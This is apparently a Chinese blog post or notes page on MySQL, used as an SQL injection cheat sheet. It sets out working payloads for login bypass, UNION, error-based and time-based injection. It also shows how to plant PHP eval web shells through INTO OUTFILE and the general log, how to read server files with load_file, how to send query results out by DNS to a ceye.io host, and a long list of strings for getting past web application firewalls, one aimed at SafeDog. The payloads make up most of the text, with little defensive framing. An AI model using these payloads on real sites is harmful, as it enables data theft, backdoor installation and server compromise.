---
author: YOUZAI
title: 基础知识
date: 2023/05/10
categories:
 - 数据库安全
tags:
 - MySQL
---

## 基础

### information_schema

MySQL 中系统自带数据库，其中有三张表格，分别是`SCHEMATA`、`TABLES`、`COLUMNS`。

* SCHEMATA

提供了当前 mysql 实例中所有数据库信息，show databases 的结果就是取自该表。

* TABLES

提供了关于数据库中的表的信息。

* COLUMNS

提供了表中的列信息，详细表述了某张表的所有列以及每个列的信息。

|表名|字段名|说明|
|:-|:-|:-|
|`schemata`|schema_name|**所有数据库的名字**|
|`tables`|table_schema|**表所属数据库的名字**|
||table_name|**表的名字**|
|`columns`| table_schema |**字段所属数据库的名字**|
||table_name|**字段所属表的名字**|
||column_name|**字段的名字**|

## 常用函数

* 获取系统信息

```sql
current_user()	# 当前用户名。
system_user(); # 当前的用户名和主机名。
session_user()	# 连接数据库的用户名。
@@basedir    # mysql 安装路径。
@@datadir    # 数据库路径。
version() # 返回当前数据库的版本信息。
@@version_compile_os	# 操作系统版本。
```

* 字符串连接函数

`concat` `concat_ws` `group_concat`

```sql
select concat(id,'|',username,'|',password) from users;
select concat_ws('|',id,username,password) from users;
select group_concat('\n',username) from users;
```

* 字符串操作函数

`substr` `mid` `left` `right` `locate`

```sql
select substr((select username from users limit 0,1),1,2); # substr(str,pos,len)，str-->字符串，pos-->截取位置，从1开始，len-->截取长度；limit表示从记录中第n个开始（n>=0)，取m条记录
select mid('martin',2,3); # mid(str,pos,len)，str-->字符串，pos-->截取位置，从1开始，len-->截取长度
select left('martin',2); # left(str,len)，str-->字符串，len-->长度，从左开始截取长度为len的字符串
select right('martin',2); # right(str,len)，str-->字符串，len-->长度，从右开始截取长度为len的字符串
select locate('security','1234security'); # 返回第一个字符串在第二个字符串首次出现的位置
select strcmp('abc','abc'); # 比较两个字符串是否相等，相等返回0，str1>str2返回1，str1<str2返回-1
```

* 返回指定 ASCII 字符对应的值 

`ascii` `ord`

```sql
select ascii('a');
select ord('a');
```

* 返回指定数字对应的 ASCII 码

`char`

```sql
select char(97)
```

* 计算相关

`length` `count`

```sql
select length(database()); # 计算数据库名长度
select count(*) from users;
```

* 时间相关

`sleep` `if` `benchmark`

```sql
select sleep(5); # 睡眠5秒
(select*from(select(sleep(5)))a)
select if((locate('s',database(),1)=1),sleep(5),1); # if(expr1,expr2,expr3)
select benchmark(10000000,sha(1)); # benchmark(loop_count,expr)，loop_count 表示循环次数，expr 执行的表达式
select get_lock('test',1);  # get_lock(lock_name,timeout)，lock_name 表示锁名，timeout 表示超时时间
```

* 注释方法

`#` `--+` `/* */` `/*! */` `/*!50000 */` mysql5 通用 带版本内联注释


## 注入语句

### 万能密码

```sql
'admin' or 1=1 #
'admin' or 'a'='a' or 'a'='a
```

### UNION注入

* 获取表名

```sql
'-1' union select 1,group_concat('</br>',table_name),3 from information_schema.tables where table_schema=database() %23
```

* 获取字段名

```sql
'-1' union select 1,group_concat('</br>',column_name),3 from information_schema.columns where table_schema=database() and table_name='users' %23
```

* 获取字段对应的值

```sql
'-1' union select 1,group_concat('</br>',username),group_concat('</br>',password) from users %23
```

### 报错注入

#### updataxml：

```sql
UPDATEXML (XML_document, XPath_string, new_value) 改变文档中符合条件的节点的值。
XML_document：String格式，为XML文档对象的名称。
XPath_string ：Xpath格式的字符串。
new_value：String格式，替换查找到的符合条件的数据。
```

* 获取表名

```sql
'1' and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)) --+
```

* 获取字段名

```sql
'1' and (updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e),1))--+ 
```

#### extractvalue：

```sql
Extractvalue(xml_frag, xpath_expr) 函数使用XPath表示法从XML字符串中提取值。
xml_frag: 目标xml文档。
xpath_expr: 利用Xpath路径法表示的查找路径。
```

* 获取表名

```sql
'1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))) --+
```

* 获取字段名

```sql
'1' and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e))) --+ 
```

#### floor：

> floor(x) 函数，向下取整,返回一个不大于 x 的值。

```sql
'1' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
```

### 写文件

- [x] root 权限。
- [x] 网站绝对路径。

```sql
'-1' union select 1,"<?php @eval($_GET[x]);?>",3,4,5 into outfile 'C:/Inetpub/wwwroot/cc.php'
```

### 读文件

- [x] root 权限。
- [x] mysql.ini 中 secure_file_pri 为空，（在 Linux 下为 my.cnf，目录是`/etc/my.cnf`）。

读取 `secure_file_priv` 配置：

```sql
SHOW VARIABLES LIKE "secure_file_priv"
```

|值|说明|
|:-|:-|
|`null`|不允许导入导出|
|`/tmp`|只能在/tmp目录下导入导出|
|`空`|允许导入导出|

写文件的时候还需要看 php.ini 里面 gpc 是否开启看，开启的情况下，特殊字符都会被转义。

```sql
union select 1,2,3,4,load_file('c:\\window\\win.ini')
union select load_file('c:/boot.ini')
union select load_file(0x633a2f626f6f742e696e69)
union select load_file('//ecma.io/1.txt') # smb 协议。
union select load_file('\\\\ecma.io\\1.txt') # 可用于 DNS 隧道。
union select load_file(char(47)) # 可以列出 FreeBSD，Sunos 系统的根目录，char(47) 就是 '/'。
```

### 写一句话木马

- [x] root 权限。
- [x] 网站绝对路径。

```sql
union select 1,2,'<?php phpinfo()?>' into outfile "E\\phpStudy\\PHPTutoral\\www\\1.php" --+
union select 1,2,'<?php phpinfo()?>' into dumpfile "E\\phpStudy\\PHPTutoral\\www\\1.php" --+
```

*outfile*和*dumpfile*的区别：

`outfile` 后面不能接 0x 开头或者 char 转换以后的路径，只能是单引号路径,但是值的部分可以是 16 进制。在使用 outfile 时,文件中一行的末尾会自动换行,且可以导出全部数据,同时如果文本中存在 \n 等字符,会自动转义成 \n,也就是会多加一个 \。outfile 函数可以导出多行，而 `dumpfile` 只能导出一行数据；outfile 函数在将数据写到文件里时有特殊的格式转换，而 dumpfile 则保持原数据格式。而使用 dumpfile 时,一行的末尾不会换行且只能导出部分数据（这里比较数据比较少,没有体现出来）；但 dumpfile 不会自动对文件内容进行转义,而是原意写入（这就是为什么我们平时 UDF 提权时使用 dumpfile 来写入的原因）。

### 堆叠注入写木马

```sql
# 主要利用 mysql 日志来写 shell。
set global general_log = "ON";set global general_log_file='C:/wamp64/www/ma.php';select '<?php eval($_POST[cmd]);?>';
```

### DNSlog外带查询

- [x] root 权限。
- [x] mysql.ini 中 secure_file_priv 必须为空。
- [x] Windows 系统。

```sql
'1' and load_file(concat('\\\\',(select database()),'.27epx0.ceye.io\\abc'))--+ # 使用 Windows 下的 UNC 路径。
```

相应的更换`select database()`查询语句便可以实现 DNS 外带的回显注入，其中 27epx0.ceye.io 为 ceye.io 平台给每个账号起的昵称。

## 绕过语句

* 大小写。
* 双写关键字。
* URL 编码。
* 内联注释。
* 等价函数替换。
* 分块传输。
* 遇到云 WAF，寻找真实 IP。
* `%0a`。
* `between a and b`。
* 缓冲区溢出。

```sql
(select * from users where id=1  and (select 1)=(Select 0xA\*1000) uNiOn SeLeCt 1,2,version();)
```

* HEX编码

```sql
unhex(hex(schema_name))
```

* 关键词过滤

```sql
过滤关键词: and, or, union
可能正则: preg_match('/(and|or|union)/i', $id)
被拦截的语句: union select user, password from users
bypass语句: 1 || (select user from users where user_id = 1) = 'admin'

过滤关键词: and, or, union, where
被拦截的语句: 1 || (select user from users where user_id = 1) = 'admin'
bypass语句: 1 || (select user from users limit 1) = 'admin'

过滤关键词: and, or, union, where, limit
被拦截的语句: 1 || (select user from users limit 1) = 'admin'
bypass语句: 1 || (select user from users group by user_id having user_id = 1) = 'admin'

过滤关键词: and, or, union, where, limit, group by
被拦截的语句: 1 || (select user from users group by user_id having user_id = 1) = 'admin'
bypass语句: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1

过滤关键词: and, or, union, where, limit, group by, select
被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
bypass语句: 1 || 1 = 1 into outfile 'result.txt'
bypass语句: 1 || substr(user,1,1) = 'a'

过滤关键词: and, or, union, where, limit, group by, select, 单引号
被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
bypass语句: 1 || user_id is not null
bypass语句: 1 || substr(user,1,1) = 0x61
bypass语句: 1 || substr(user,1,1) = unhex(61)

过滤关键词: and, or, union, where, limit, group by, select, 单引号, hex
被拦截的语句: 1 || substr(user,1,1) = unhex(61)
bypass语句: 1 || substr(user,1,1) = lower(conv(11,10,36))

过滤关键词: and, or, union, where, limit, group by, select, 单引号, hex, substr
被拦截的语句: 1 || substr(user,1,1) = lower(conv(11,10,36))
bypass语句: 1 || lpad(user,7,1)

过滤关键词: and, or, union, where, limit, group by, select, 单引号, hex, substr, white space
被拦截的语句: 1 || lpad(user,7,1)
bypass语句: 1%0b||%0blpad(user,7,1)

大小写：
标准: SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'
Bypassed: sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'

URL编码：
被阻断语句: uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)
Bypassed: uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29

一些绕过语句：
0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
amUserId=1 union select username,password,3,4 from users
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
1%0bAND(SELECT%0b1%20FROM%20mysql.x)
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
```

* 绕过安全狗

```sql
group_concat(0x3C68343E42797061737320736563757269747920646F672073716C5F696E6A6563743C68343E,0x3C68723E,0x4D7953514C20506F72743A20202020,@@port,0x3C68723E,0x4D7953514C2076657273696F6E3A,@@version,0x3C68723E,0x4D7953514C5F696E7374616C6C5F706174683A2020,@@basedir,0x3C68723E,0x4D7953514C5F64617461626173655F706174683A20202020,@@datadir,0x3C68723E,0x43757272656E7420646174616261736520757365723A20202020,current_user,0x3C68723E,0x73797374656D2076657273696F6E3A20202020,@@version_compile_os,0x3C68723E,0x686F73746E616D653A20202020,@@hostname,0x3C68723E,0x43757272656E742064617461626173653A20202020,database/*!()*/,0x3C68723E,0x5573657220496E666F3A20202020,user/*!()*/)
```